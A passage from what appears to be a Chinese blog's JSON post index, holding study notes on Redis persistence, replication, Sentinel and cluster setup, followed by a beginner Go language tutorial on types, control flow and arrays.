1，这个命令表示900秒内执行了一次set命令就生成一次RDB持久化文件（自动触发）\n注意：如果之前存在RDB文件，执行sava命令，会生成一个新的RDB文件去覆盖这个老的RDB文件\n触发第一种模式很简单，就执行sava命令（时间复杂度为O(n)），redis接收该命令，就会立刻去创建生成RDB文件\n触发第二种模式，也很简单，也是就执行bgsave命令（时间复杂度为O(n)），不过redis接收该命令后会利用Linux的fork()函数来生成一个子进程，让这个子进程来处理生成RDB文件\nsave和bgsave的区别就是，save会阻塞命令的执行，bgsave需要另一个进程来处理（消耗内存）\n第三种模式通过配置文件来自动触发，当满足条件时，创建RDB文件是通过bgsave命令完成的\n配置文件参数还有dbfilename（来表示rdb文件名，必须是.rdb后缀），以及上面提到的dir（来表示rdb持久化文件放到哪个文件夹中），stop-writes-on-bgsave-error（如果bgsave命令发生错误是否停止写入，yes或者no），rdbcompression（rdb文件是否使用压缩模式），rdbchecksum（是否对rdb文件进行检验操作）\n恢复数据也很简单，将ADB文件放到redis安装目录下，然后重启（redis会在启动的时候根据RDB文件来恢复数据），可执行CONFIG GET dir来得到redis安装目录地址\nRDB的缺点就是耗时（生成RDB文件慢，因为需要复制全部数据，时间复杂度是O(n)），内存消耗大（fork进程），硬盘资源消耗大（当数据很庞大时），而且不可控制（无法指定什么时间备份），存在丢失数据的风险（当自动备份没有触发，而且也没有手动触发时宕机，就会导致数据丢失了）\nAOF（每执行一次写命令（例如：SET，HMSET，SADD），就会将该命令存储在AOF文件中，类似于MySQL的sql备份）\n通过redis.conf配置文件来配置AOF，appendonly（是否启动AOF持久化模式），appendfilename（AOF持久化文件名称，必须是.aof后缀），appendfsync（AOF的三种持久化策略：always（每次执行写命令时间都会将该命令同步到AOF可持久化文件中），everysec（每秒将缓存区中的命令同步到AOF可持久化文件中），no（不需要将缓存区的命令同步到AOF可持久化文件中，让操作系统来决定什么时候同步，Linux系统默认30秒将缓存区数据写入）），no-appendfsync-on-rewrite（表示是否在同步期间对新写命令不进行同步，先将其存储在缓存区，等同步完成在写入，如果no的话，会阻塞appendfsync，如果设置yes可能存在会丢失数据的风险（新写命令没有持久化，Linux默认每隔30秒执行一次缓存区同步到硬盘的操作）），auto-aof-rewrite-percentage（因为AOF是使用追加的方式的，因此AOF可持久化文件会越来越大，因此存在AOF重写机制（简化AOF文件里面命令，例如去除过期命令，将多条命令合并成1条命令等等，得到新的AOF后，将老的删除，写入新的），当满足某个阀值时，会启动AOF重写，该参数是表示当前AOF文件大小是上次的大小的多少倍触发（单位为百分比，100就是指一倍），auto-aof-rewrite-min-size（当AOF大于该阀值时触发，例如64mb），aof-load-truncated（因为AOF文件可能是不完整的（宕机或者异常导致的不完整），表示是否在恢复数据时自动进行AOF修复操作，no表示不，需要手动redis-check-aof修复，yes表示是的），dir参数和RDB介绍一样的作用（AOF文件存储在哪个目录）\n手动修复命令redis-check-aof \u0026ndash;fix\n手动AOF重写命令bgrewriteaof（执行到该命令会让redis服务器fork一个子进程来进行AOF重写操作，不会阻塞命令执行，而且只有当完成之后创建一个新的AOF文件来覆盖老的AOF文件（不存在bgrewriteaof命令执行失败后，导致数据丢失的情况，必须时执行成功后再覆盖））\n注意：auto-aof-rewrite-percentage和auto-aof-rewrite-min-size，必须都满足这2个设置的阀值才会重写（避免AOF文件很小也导致触发）\n注意：每次执行写命令时间并不会立刻同步到AOF可持久化文件中去，而是先写入缓存区，再根据策略来同步到AOF可持久化文件，每个策略都有自己的缺点和优点，always不怕丢数据，但是IO消耗大，everysec对硬盘友好，但是存在丢失那1秒数据的风险，no不可控制什么时候同步，但是性能高\nAOF恢复数据和RDB一样，将AOF文件放到Redis安装目录下\n优化fork\nfork()操作是同步的，内存越大耗时越慢，可通过latest_fork_usec命令查看最近一次fork操作的耗时（单位微秒）来进行排查，例如：redis-cli info latest_fork_usec\nmaxmemory配置Redis实例最大可用内存，例如：CONFIG SET maxmemory 100MB或者修改redis.conf的maxmemory参数\n通过配置Linux内存分配策略，例如：vm.overcommit_memory = 1（1表示内核允许超量使用内存，直到用完，0表示内核会检查是否还有足够的内存，如果有则对内存申请通过，否则失败，2表示内核不会超量使用内存，整个内存空间不会超过swap+50%的RAM，课外小知识：Linux内核会批准大部分的申请内存的请求，但是分配到了内存后，不能使用内存，只有当内存赋值时才分配内存，这个技术叫overcommit，如果策略允许超量使用时，也就是允许overcommit，当内存分配不足时，会导致OOM killer，通过杀死用户态进程来释放内存）\n通过提高AOF或者RDB自动触发生成的阀值来降低fork的频率，非不必要时不进行自动触发\n优化子进程\nCopy on write机制：fork会创建一个除了pid不同外和父进程完全相同的子进程，但是这些数据是对子进程无用的（因为子进程使用exec()来实现自己的功能时，会清空这些数据），Copy On Write可以让子进程和父进程共享内存空间（直接引用父进程的内存空间，这样子进程更轻量化了，实质上在没有exec()之前，子进程和父进程使用的是同一块物理内存，只是虚拟内存不同，当exec之后，才会给子进程分配一个独立的物理内存）\n该机制的优点就是减少不必要的内存分配，缺点是当fork之后父进程或者子进程进行写操作，会导致页异常中断（page-fault），因为这个时候子进程和父进程都还是同一块物理内存，最后因为复制数据导致资源浪费\nAOF追加阻塞（everysec策略，每1秒进行一次同步操作）\n因为主线程会对比AOF的同步时间，如果上一次同步时间在2秒，则正常，超过2秒后，主线程将会导致阻塞，一直到同步操作完成，因此everysec策略最多可以丢2秒的数据\n主从复制（提供数据副本（数据灾备），扩展读性能（读写分离））\n从节点复制主节点的数据（一从一主或者一主多从）\n主从复制配置（有2种）\nslaveof命令（在从节点中运行该命令，例如slaveof 192.168.1.2 6379，就能复制主节点192.168.1.2:6379的数据了，而且主节点的数据更新都能同步到从节点中）\n将该节点取消从节点 slaveof no one\n配置（redis.conf）\n配置主节点 slaveof 192.168.1.2 6379\n如果需要设置从连接主的密码，需要设置masterauth参数，例如masterauth \u0026ldquo;123456\u0026quot;或者执行命令config set masterauth \u0026ldquo;123456\u0026rdquo;\n如果需要设置密码，可以设置requirepass参数，例如requirepass \u0026ldquo;123456\u0026quot;或者执行命令config set requirepass \u0026ldquo;123456\u0026rdquo;\n如果想设置从节点只读，可以设置slave-read-only yes，如果设置no，写入的数据也会在主从同步完成后被删除\n全量复制和部分复制\n全量复制就是将主节点的全部数据一次性发送给从节点复制\n部分复制就是主从复制过程导致数据丢失了，从节点在连接到主节点后，主节点可以将丢失的数据发送给从节点，从而避免全量复制的过高的资源消耗\nrunid（redis服务器的标识符（用于区分redis服务器），一重启redis服务器后runid都会发生改变）\n可通过info server | grep run命令来查看\n复制偏移量就是命令的字节长度，可以用于判断主从节点数据是否一致，可使用info replication命令查看\n主节点会记录自身的复制偏移量（master_repl_offset，可通过info replication查看），从节点也会每秒将自身的复制偏移量发送给主节点（slave的offset），这样主节点就可以记录从节点的复制偏移量\nSentinel架构（不可存储数据，对redis节点的故障判断，故障master转移处理以及通知客户端该节点状态）\n故障转移：当多个sentinel发现master存在故障，会通过选举算法选举出一个sentinel，然后该sentinel会选择一个slave从节点来当master主节点，最后通知其他slave从节点成为该新的master的从节点并且通知客户端主从节点的变化（如果出现故障的master恢复后会成为新的master的从节点）\n安装Sentinel和配置\n开启主从节点，然后开启Sentinel监控主节点\nSentinel配置文件（sentinel.conf，redis配置文件的参数可用于Sentinel配置文件（例如port，dir都是可以的，Sentinel就是特殊的redis））\nsentinel monitor hallomaster 127.0.0.1 6379 2\rsentinel down-after-milliseconds hallomaster 30000\rsentinel parallel-syncs hallomaster 1\rsentinel failover-timeout hallomaster 180000\r第一行是该Sentinel监控的master节点的信息，hallomaster是master节点名称，master节点IP，master节点的端口，以及当多少个Sentinel认定该master节点存在故障时进行故障转移\n第二行Sentinel监控master节点故障多少毫秒后认定故障\n第三行表示发送故障转移时最多能有几个从节点对新的master进行同步（越少，新的master压力越小）\n第四行表示故障转移时最多允许多少毫秒，当超过时，认定故障转移失败\n启动Sentinel监控节点\nredis-sentinel redis-sentinel.conf\r注意：因为选举算法的原因，Sentinel监控节点最少要有3个，如果只有2个Sentinel监控节点，发生故障，因为投票机制问题（要选一个Sentinel监控节点来当Sentinel监控主节点，让这个Sentinel监控节点来确定哪个从节点来当主节点），只有当Sentinel监控集群超过一步的节点检测失效才会生效，而且Sentinel监控节点也发生故障了，导致故障转移无法生效，而且Sentinel监控节点数最后是奇数，避免投票偶数出现相同票数的情况\nSentinel监控节点定时任务\nSentinel监控节点每10秒对master和slave执行info（用来发现slave以及主从关系的确认），每2秒对master节点的channel进行交换信息（订阅发布，频道名为__sentinel__:hello），每1秒对其他Sentinel以及redis主从节点执行ping\n客观下线和主观下线，以及领导者选举\n客观下线\nsentinel monitor hallomaster 127.0.0.1 6379 2\n主观下线\nsentinel down-after-milliseconds hallomaster 30000\n当主观下线条件满足后，会执行sentinel is-master-down-by-addr命令来询问其他Sentinel监控节点是否确定master已经下线了\nsentinel is-master-down-by-addr 127.0.0.1 6379 0 *\n每个做主观下线的Sentinel监控节点向其他Sentinel监控节点发送该命令，并且要求设置该为领导者\n如果接收该命令的Sentinel监控节点没有同意过其他Sentinel监控节点的请求，那么将同意，否则拒绝（在周期内）\n如果Sentinel监控节点发现自己的票超过了Sentinel集合的半数，并且也是超过了客观下线的条件时，该监控节点成为领导者\n如果有多个Sentinel监控节点成为领导者，将会在一段时间后重新选举\n领导者节点会从slave节点中选择一个来当master节点，对该slave节点执行slaveof no one命令来让它成为新的master节点，然后对其他slave节点发送命令，来让其成为新的master节点的slave节点\n然后对故障的master节点配置为slave节点，并且进行监控，当其恢复则发送命令让其去复制新的master节点\n领导者节点选择slave节点当master节点的机制\n选择slave-priority（slave节点优先级）最高的slave节点，存在返回，不存在继续选择\n选择复制偏移量最大的slave节点（复制master节点最完成的），存在返回，不存在继续选择\n选择runID最小的slave节点（也就是最早的slave节点）\n手动故障转移master节点（当需要对master节点进行下线之前的操作）\nsentinel failover hallomaster\nredis cluster\nCluster（集群，解决QPS（或者OPS）无法满足业务需求，硬件无法满足业务需求）\n数据分区（常用的有顺序分区，哈希分区）\n顺序分区：按照顺序（id或者时间等等顺序）进行划分Redis实例，缺点是数据分布不均匀\n哈希分区：具有随机性，数据分布均匀，缺点是无法进行顺序访问\n哈希分区有节点取余分区，一致性哈希分区，虚拟槽分区\n节点取余分区，一致性哈希分区都是客户端分片，在客户端进行计算\n节点取余分区：hash(key)%nodes，优点：简单，缺点：增加或者减少节点需要重新计算来重新映射（推荐采用翻倍扩容来降低影响），重新计算将导致重新计算数据偏移量，节点数越多，花费的时间越长\n一致性哈希分区：hash(key)%2^32，将哈希构造成一个0~2^32的token环形结构，节点的范围在该环形结构内，因为该数值足够大，增加或者减少节点不会导致重新计算哈希的问题\n数据哈希化后，会根据顺时针方向来寻找自己的node节点（简单来说就是将全部数据构造成一个环形，分区就跟切蛋糕一样，该蛋糕是该node节点的，那个蛋糕是那个node节点的）\n增加或者减少节点，将导致数据范围减少或者增加，但是不会像节点取余分区一样，需要重新计算，重新分配数据，数据的偏移量和节点数有关，节点数越多，数据的偏移量越少（10个节点，数据的偏移量只有10%，100个节点，数据的偏移量只有1%），只会影响邻近节点（也可使用翻倍伸缩）\n虚拟槽分区（客户端计算hash，在服务端进行管理节点，槽以及数据）：Redis内置了16384个槽，每个槽都可映射成单个节点（当然节点不可能用这么多，一般都是节点使用多个槽，将16384个槽平均分配给每个节点，CRC16(key)\u0026amp;16383，每个节点都知道自己负责哪个槽，其他节点负责哪个槽（共享节点信息））\n搭建集群\n集群的部署有原生命令部署和官方工具（redis-trib.rb）部署这2种\n原生命令安装\n配置redis文件（redis-192.168.1.2.conf）\ncluster-enabled yes\rcluster-config-file nodes-192.168.1.2.conf\rcluster-node-timeout 15000\rcluster-require-full-coverage no\rcluster-enabled yes表示该redis节点是集群的节点，cluster-config-file为集群运行时，记录该节点的配置以及其他节点的信息状态等等，cluster-node-timeout表示集群中节点失联的最大时间（单位为毫秒），当超过该时间会认定其故障，cluster-require-full-coverage表示是否需要集群的全部节点服务（也就是说为yes时如果只有一个节点故障了，那么这个集群就不可用了）\n开启redis\nredis-server redis-192.168.1.2.conf\r添加集群节点（只需要在一个节点上配置，因为节点之间存在通信交互，当a节点和b节点连接后，a又和c节点连接，b节点知道c节点的存在后彼此感知着对方）\ncluster meet 192.168.1.2 6379\r分配槽（必须将0到16383的16384个槽全部分配完才能处于上线工作状态，这里设置了3个集群主服务）\n192.168.1.2 cluster addslots {0\u0026hellip;5461}\n192.168.1.3 cluster addslots {5462\u0026hellip;10922}\n192.168.1.4 cluster addslots {10923\u0026hellip;16383}\n设置主从关系（故障转移，集群复制，这里是3个主节点和3个从节点来保证高可用）\n192.168.1.5 cluster replicate 主节点的node-id\n192.168.1.6 cluster replicate 主节点的node-id\n192.168.1.7 cluster replicate 主节点的node-id\nnode-id通过cluster nodes命令获取\n查看集群节点的状态\ncluster info\r查看集群节点的槽分配情况\ncluster slots\r测试集群上线情况（-c是以集群模式连接）\nredis-cli -c -p 6379\rset hallo word\r返回ok则认为集群已上线\n集群伸缩\n通过分配槽的16384个槽来进行集群的伸缩\n伸：当需求得不到满足时，添加新节点进来 缩：当不需要这个节点时或者这个节点故障了，移除该节点，下线\n原理就是数据和槽在节点的迁移\n扩容节点\n创建新的节点，这个节点还是孤立节点，需要加入到集群\ncluster meet 192.168.1.10 6385\n查看加入集群是否成功\ncluster nodes\n加入集群后因为没有分配槽，是不进行工作的\n迁移数据和槽\n计算，平均槽数量\n配置主从（新加入的节点设置为从节点）\ncluster replicate 主节点的id\n如果需要配置该节点为主节点，可以\ncluster meet 196.168.1.10 6385\n迁移数据非常麻烦，这里使用redis-trib.rb来完成\nredis-trib.rb是redis官方推出的redis集群管理工具（因为是用ruby编写成的工具，需要安装ruby和rubygem redis客户端）\n安装redis-trib.rb\n安装ruby（redis-trib.rb依赖于ruby）\n使用编译源码的方式来安装ruby\nhttps://cache.ruby-lang.org/pub/ruby/3.1/ruby-3.1.2.tar.gz\n安装redis模块\ngem install redis\nredis-trib.rb实质上在redis源码的src目录里，可以拷贝redis-trib.rb到/usr/bin目录下，或者创建一个软链接都可以\n分配槽数据\nredis-trib.rb reshard 192.168.1.2:6385\n它会问你进行迁移多少个槽，1到16384，根据需求进行分配\n然后问你槽迁移到哪个节点，提供节点ID\n最后它问你源节点的id是什么，如果使用all，将表示全部节点都作为分配槽的源节点，当然也可以指定源节点，只需要输入其节点id即可，输入完毕后输入done完成\n它问你操作是否确认，无误yes，有误请no，输入完毕后就会进行迁移\n收缩集群\n下线节点持有槽进行迁移，通知其他节点忘记该下线节点，下线节点\n忘记节点可通过cluster forget 节点ID来完成，这个命令可以让当前节点忘记目标id的节点\n注意：该命令存在时效性，60秒内有效，如果60秒内集群内的节点都没有使用该命令忘记该节点，会导致该节点忘记失败，因为只有有一个节点没有忘记都会对该节点进行通信，导致其他节点忘记命令失效\n迁移槽数据\nredis-trib.rb reshard \u0026ndash;from 需要下线的节点id \u0026ndash;to 迁移数据到哪个节点的id \u0026ndash;slots 迁移多少个槽 192.168.1.10:6385\n是否确认操作，yes或者no\n如果需要将槽分配给多个节点，需要多次执行该命令，只需要修改迁移数据到哪个节点id和迁移多少个槽即可，迁移多少个槽给哪个节点，看需求分配\n下线节点（这个192.168.1.2:6385是集群内部的节点，不是下线节点，通过该节点来广播）\nredis-trib.rb del-node 192.168.1.2:6385 需要下线的节点id\n下线主节点，从节点都可以用这个，但是下线前请确保该节点的槽已经分配给其他节点，保证下线节点无槽，无任务，因为该命令会将该节点从集群中删除，并且该节点也被删除，这个节点将不存在\n故障发现，故障恢复\n集群完整性\n带宽消耗\npubsub广播\n集群倾斜和数据倾斜，以及请求倾斜\n读写分离\n数据迁移\n集群和单机\n缓存更新策略\n缓存粒度，穿透，无底洞问题\n","permalink":"https://99999.fun/posts/97/","summary":"Redis是NoSQL数据库（Not Only SQL）家族的代表之一，其特点就是基于内存运行，支持分布式，key-value存储\nRedis具备速度快，支持多种数据结构，可持久化，支持主从复制，具备高可用，分布式等特点\n可以将内存中的数据存储到磁盘中，重启的时候再加载使用，保证数据的持久性，支持备份恢复，常用于缓存数据库（辅助持久化数据库）\n因为其是以内存作为存储介质，因此读写数据的效率极高，读取速度可高达110000次/s（也就说可达到10W QPS，QPS（Queries Per Second）:每秒查询率），写速度高达81000次/s\nRedis将数据存储于内存中，Redis会将数据的更新异步存储到磁盘中来持久化，Redis数据持久化有2种方式，分别是RDB（Redis DataBase）和AOF（append only file）\nRedis支持多种数据结构，例如：string（字符串），hash（哈希），list（列表），set（集合），zset(Sorted Set: 有序集合)，BitMaps（位图），HyperLogLog（超小内存唯一值计数），GEO（地理信息定位）\nRedis支持分布订阅，Lua脚本，事务，pipeline等功能，支持主从复制，确保高可用\nRedis可以用来当做缓存系统，用户访问app应用服务时，一般来说会优先从缓存中读取，如果缓存没有再到存储介质中读取，并且将该数据会在存储在缓存中，这个缓存就是Redis\nRedis安装\n编译安装（linux）\n下载redis-x.x.x.tar.gz\n解压\ntar xzf redis-x.x.x.tar.gz\n进入解压出来的文件夹中，执行make\u0026amp;\u0026amp;make install命令\n因为用的是默认配置\n进入src，./redis-server ../redis.conf\n测试客户端\n./redis-cli\nsrc目录下可看到6个可执行文件，作用如下：\nredis-server可执行文件用于启动redis服务器\nredis-cli可执行文件用于redis命令行客户端，用于连接redis服务器\nredis-benchmark可执行文件用于redis性能测试，基准测试\nredis-check-aof可执行文件用于修复AOF可持久化文件\nredis-check-dump可执行文件用于RDB可持久化文件的检查工作\nredis-sentinel可执行文件用于启动高可用的sentinel模式（该模式又叫哨兵）\n使用redis并不推荐使用windows，虽然微软官方提供了redis补丁，但是redis版本太低了，建议使用Linux虚拟机或者docker容器来跑\nredis有3种启动服务器方式\n默认配置启动\nredis-server\n动态参数启动\nredis-server \u0026ndash;port 6380\n配置文件启动（推荐，通过redis.conf文件来进行配置）\nredis-server configPath\n客户端连接服务（6379是redis默认端口）\nredis-cli -h 127.0.0.1 -p 6379 -a \u0026ldquo;root\u0026rdquo;\nredis.conf配置\n默认端口为6379\nport 6379\n要远程访问则设置为0.0.0.0\nbind 127.0.0.1\nlogfile，redis日志名\ndir，redis工作目录（日志文件和持久化文件存储在哪个文件）\n以守护进程运行（yes为守护进程），注意如果是以守护进程运行，那么会默认将pid写入到/var/run/redis.pid\ndaemonize yes","title":"Redis学习笔记"},{"content":"Golang又叫go语言，golang是它的全称，是由Google开发的一种静态强类型，编译型，并发型，并具有垃圾回收功能的编程语言\ngo语言确保达到静态编译语言的安全和性能的同时，又达到动态语言的开发维护效率\nGo语言天生支持并发，提供自动垃圾回收机制\ngo的源文件是xxx.go\n值得一提的是哔哩哔哩网站后端就是用golang开发，这个足以说明golang的并发功能有多强大了\n检查是否安装成功go\ngo version\n环境配置\nGOROOT对应着go的安装目录\nGOPATH对应着go的源代码目录（可以放多个目录）\nGOBIN对应着 go install安装和编译的二进制程序的安装目录\n检查go环境\ngo env\n源程序默认为UTF-8编码，;可省略\n第一个go程序\npackage main\rimport \u0026quot;fmt\u0026quot;\rfunc main(){\rfmt.Println(\u0026quot;hallo golang\u0026quot;)\r}\rgo run hallo.go\n当然作为一个编译型语言，编译成二进制文件是支持的\ngo build hallo.go\n作为一个静态强类型语言，如果学过java的话，理解还是很轻松的\n定义包 package : 必须在源程序上声明该文件是属性那个包的\n引入包 import : 导入包，引用外部包开扩展功能\n注释\n// 单行\n/* 多 行 */\n标识符命名规范：第一个字母必须是字母或者下划线，而且不能是关键字，特殊符号只支持下划线\n常用的数据类型有：\n整型：int（有符号），uint（无符号），rune，int/unint(8,16,32,64)\n浮点型：float(32,64)，comple\n布尔型：bool（true，false）（bool默认值为false）\n字符串型：string\n数组：array\n结构体：struct\n变量\nvar abc string = \u0026ldquo;hallo\u0026rdquo;\n注意：如果声明变量了，但是没有初始化，那个该变量的值为系统默认设置的值（零值）\n定义多个变量\nvar abc xyz string = \u0026ldquo;hallo\u0026rdquo;,\u0026ldquo;word\u0026rdquo;\n而且go会根据提供值来判断数据类型是什么，例如：\nvar xyz = 666\ngo还提供一个特殊的运算符 :=，可以在变量不被声明的情况下使用，例如：\nhallo,word := \u0026ldquo;hallo\u0026rdquo;, \u0026ldquo;word\u0026rdquo;\n:=在实质开发中会经常使用的\ngo类型强制转换（和java一样，高精度转为低精度会失真）\nvar abc int = 666\nvar xyz float = 3.14\nvar gg string = \u0026ldquo;123\u0026rdquo;\nfloat(abc) // 强制转换为浮点数\nint(xyz) // 强制转为整型，会失去小数点之后的数值\nstrconv.Itoa(abc) // 强制转为字符串\nstrconv.Atoi(gg) // 强制转为整型\n注意：同一作用域中不能重复声明，而且必须要声明变量才能使用，而且必须要使用\n声明多个变量\nvar abc,xyz,hallo int\nvar(\rabc int\rxyz float\r)\r常量\n和其他语言一样，常量表示的就是不可修改的变量\nconst abc, xyz int = 123, 666\ngo还提供了一种特殊的定义方式，例如：\nconst(\ra = \u0026quot;hi\u0026quot;\rb = \u0026quot;hallo\u0026quot;\r)\r如果声明多个常量时，省略了值那么就是表示和第一行值相同，例如：\nconst(\ra = 123\rb\rc\r)\r注意：定义的时候必须赋值\niota常量计数器\nconst(\ra = iota\rb\r_\rd\r)\riota在出现const关键字时重置为0，const每增加一行常量声明，iota加1（自增长），_（下划线，空白标识符（占位），常用于忽略函数多个返回值，例如err）为跳过某些值\n类型\ngolang的数据类型分为基本数据类型和复合数据类型\n基本数据类型有整型，浮点型，字符串，布尔型\n复合数据类型有数组，函数，切片，结构体，字典（map），通道（channel），接口\n注意：像整型有很多种，像int8，int16，int32，uint8，uint16等等，如果直接写int的话，在不同的操作系统中是不一样的，32为操作系统的int指的是int32，64位操作系统指int64\n可使用unsafe.Sizeof查看变量的长度（在内存中的存储空间），例如：\nvar num100 = 100\rfmt.Println(unsafe.Sizeof(num100))\r值类型：值类型被声明变量后，不管有没有赋值，都会分配内存给它，也就是说值类型的声明不需要分配内存，因为在声明的时候已经分配好了内存\n引用类型：变量存储的是一个地址，地址对应的内存空间就是真正存储数据的，引用类型必须申请内存才能使用，例如make()\n自定义类型：可以使用type关键字来自定义类型，例如：type Testint int // 将Testint定义为int类型\n类型转换\n注意：高位转低位会出现精度丢失，例如\nvar abc int16 = 666\rfmt.Println(int8(abc)) // -102\r数字字面量语法\ngo1.13版本+，引入了数字字面量语法，方便使用二进制，八进制，十六进制的格式定义数字，例如:\nabc := 0b10100010101000001011\rfmt.Println(abc) // 666123\r0b表示二进制\n0o表示八进制\n0x表示十六进制\n进制的转换\nvar abc int64 = 100\rfmt.Println(abc)\ra := strconv.FormatInt(abc, 2) // 二进制\rfmt.Println(a)\rb := strconv.FormatInt(abc, 8) // 八进制\rfmt.Println(b)\rc := strconv.FormatInt(abc, 10) // 十进制（默认）\rfmt.Println(c)\rd := strconv.FormatInt(abc, 16) // 十六进制\rfmt.Println(d)\r浮点型（也就是小数）\nGo的浮点型分为float32和float64\nfloat32的浮点数的最大范围为3.4028234663852886e+38，可用math.MaxFloat32输出查看\nfloat64的浮点数的最大范围为1.7976931348623157e+308，可用math.MaxFloat64输出查看\nvar pi = math.Pi\rfmt.Printf(\u0026quot;%f\\n\u0026quot;, pi) // 默认小数点6位\rfmt.Printf(\u0026quot;%.10f\\n\u0026quot;, pi) // 指定输出小数点后几位\r字符串\ngo语言字符串编码为UTF-8\n例如： hallo := \u0026ldquo;你好 Word\u0026rdquo;\n可输出多行字符串\nvar str123 = `第一行\r第二行\r第三行`\rfmt.Println(str123)\rlen()：字符串长度\n+或fmt.Sprintf：拼接字符串\nstrings.Index()：返回字符在字符串中的位置\nstrings.contains：返回是否包含某个字符\n布尔类型\nvar abc = false var xyz = true\nbyte和rune类型\n组成字符串的元素叫字符，可遍历字符串获取字符\ngo语言的字符分为2种类型，分别为uint8（byte，表示ACII码的一个字符）和rune类型（表示一个UTF-8字符）\n因此使用非ACII码的字符，需要使用rune类型（一个汉字占3个字节，字母只占一个字节）\n注意：修改字符串必须将其转换为byte或者rune类型，完成修改后再转回string，例如：\nhallo := \u0026quot;你好,golang\u0026quot;\rabc := []rune(hallo)\rabc[0] = '您'\rfmt.Println(string(abc))\r整型转字符串类型\nvar a int = 100\rb := fmt.Sprintf(\u0026quot;%d\u0026quot;, a)\rfmt.Printf(b)\r字符串转整型或者浮点型\nstr := \u0026quot;666\u0026quot;\rstr1 := \u0026quot;3.14\u0026quot;\rstrScore, err := strconv.Atoi(str)\rfmt.Println(strScore, err) // err为转换失败的信息\rnum, err := strconv.ParseInt(str, 10, 64)\rfmt.Println(num, err)\rnum1, err := strconv.ParseFloat(str1, 10)\rfmt.Println(num1, err)\r运算符\n+：加，-减，*乘，/除，%求余\n注意：在go中，++和\u0026ndash;是单独使用的，是没有++i的，正确写法例如：\nvar i int = 64\ri++\r// ++i 错误\rif判断\npackage main\rimport \u0026quot;fmt\u0026quot;\rfunc main(){\rabc := 123\rif abc \u0026gt;666{\rfmt.Println(\u0026quot;abc大于666\u0026quot;)\r} else if abc \u0026lt; 666{\rfmt.Println(\u0026quot;abc小于666\u0026quot;)\r}else{\rfmt.Println(abc)\r}\r}\rif的另一种写法：\nif abc:=123; xyz\u0026gt;=100{\rfmt.Println(\u0026quot;abc\u0026gt;=100\u0026quot;)\r}\rswitch判断（用于对大量的值进行判断）\nxyz := \u0026quot;abc\u0026quot;\rswitch xyz {\rcase \u0026quot;abc\u0026quot;:\rfmt.Println(\u0026quot;1\u0026quot;)\rcase \u0026quot;123\u0026quot;:\rfmt.Println(\u0026quot;2\u0026quot;)\rdefault:\rfmt.Println(xyz)\r}\rswitch判断的另一种使用方法\nswitch abc := \u0026quot;hallo\u0026quot;; abc {\rcase \u0026quot;hallo\u0026quot;:{\rfmt.Println(\u0026quot;hallo\u0026quot;)\rbreak\r// 不用break也能跳出switch语句\r}\rcase \u0026quot;hi\u0026quot;,\u0026quot;hello\u0026quot;:{\r// 多个值用逗号分隔\rfmt.Println(\u0026quot;hi\u0026quot;)\rfmt.Println(\u0026quot;hello\u0026quot;)\rbreak\t}\rdefault:{\rfmt.Println(\u0026quot;hallo word\u0026quot;)\rbreak\r}\r}\r如果想继续执行下一个case，可以使用fallthrough语句（switch最后一个分支不要使用fallthrough语句，否则报错，而且不能在case语句中间使用，必须是在case语句最后一个语句中使用）例如：\nfunc hallo() int {\rabc := 100 + 666 + 123\rreturn abc\r}\rfunc main() {\rswitch abc := hallo(); {\rcase abc \u0026gt; 500:\rfmt.Printf(\u0026quot;num \u0026lt; 500\\n\u0026quot;)\rfallthrough\rcase abc \u0026gt; 666:\rfmt.Printf(\u0026quot;num \u0026lt; 666\\n\u0026quot;)\rfallthrough\rcase abc \u0026gt; 123:\rfmt.Printf(\u0026quot;num \u0026lt; 123\\n\u0026quot;)\r}\r}\rfor循环\nfor abc := 1; abc\u0026lt;10 ; abc++{\rfmt.Println(abc)\r}\rgolang是没有while循环语句，但是可以使用for循环来做出类似的功能\nabc := 1\rfor abc\u0026lt;10 {\rfmt.Println(abc)\rabc++\r}\rfor循环可用break，goto，return，panic语句退出循环\nbreak跳出循环\n一次性跳出多层循环 break LOOP\ncontinue是退出当前循环\ngoto是无条件转移到goto语句的行，可用于跳出循环，条件转移，例如：\nfunc main() {\rvar abc int = 123\rLOOP:\rfor abc \u0026lt; 666 {\rif abc == 233 {\rabc = abc + 1\rgoto LOOP\r}\rfmt.Printf(abc)\rabc++\r}\r}\rreturn可用于函数或者方法中，用于跳出当前函数或者方法，如果return语句在main函数中，将是终止程序运行，在普通函数中，将是终止当前函数执行（return后面的程序不执行了）\n当return没有带返回值，将是终止，如果带返回值，那么就是终止并且返回值\ngo语言并没有像java那样的异常嵌套机制，go语言用panic-and-recover来替代\npanic可中断原来的流程控制，某个函数调用了panic，将终止该函数的执行，如果有延迟函数（defer）则执行该defer函数，返回其调用者，一直到goroutine（goroutine是go语言的轻量级线程，由runtime管理，go语言会智能的将goroutine中的任务合理分配给每个CPU，go程序在运行时，会给main()函数建立一个默认goroutine，用go关键字创建goroutine，例如：go 函数名(参数)）的全部函数都返回，然后打印panic信息，堆栈信息，最后到终止程序\npanic：在任何地方都可以触发 recover：只在用了defer修饰的函数内有效\n注意：平时不要用panic-and-recover，而是errors，只有当程序不能继续执行了才用，例如出现不可恢复的错误，不能再让它继续执行了，这里举个例子：\nfunc abc() {\rfmt.Println(\u0026quot;hallo word\u0026quot;)\r}\rfunc hallo() {\rdefer func() {\rerr := recover()\rif err != nil {\rfmt.Println(\u0026quot;hallo word\u0026quot;)\r}\r}()\rpanic(\u0026quot;runtime error!!!\u0026quot;)\r}\rfunc main() {\rabc()\rhallo()\r}\rerrors（在go语言中，发生错误，是通过返回errprs值，来对errprs值进行修改或者忽略，当没有错误时，rrprs值为nil，因此可以通过判断errors的值是否为nil来知道是否出现错误，以及处理错误）\nfor range循环（可用于遍历数组，字符串，字典（map），切片（数组），channel（通道））\nfor range循环数组，字符串，切片返回索引和值，字典（map）返回键和值，channel（通道）返回通道内的值\n例如：\nvar abc = \u0026quot;hallo word\u0026quot;\rfor key, index := range abc {\rfmt.Printf(\u0026quot;%v:%c,\u0026quot;, key, index)\r}\r数组（在go中，数组是指同一系列，同一类型的数据集合，组成数组的数据叫元素，go语言的数组的元素是被分配到连续的内存地址中，索引元素是速度非常快的）\nvar abc [16]int // 定义int类型，元素个数为16的数组\rabc[0] = 10\rabc[1] = 66\rfmt.Println(abc)\rvar xyz = [3]string {\u0026quot;hallo word\u0026quot;,\u0026quot;golang\u0026quot;,\u0026quot;hahaha\u0026quot;}\rfmt.Println(xyz)\rvar a = [...]int{1, 2, 3, 4, 5} // 自动判断数组长度\rfmt.Println(a)\rb := [...]int{1: 66, 3: 100}\rfmt.Println(b)\r遍历数组\nhallo := [...]int{1: 66, 3: 100}\rfor i := 0; i \u0026lt; 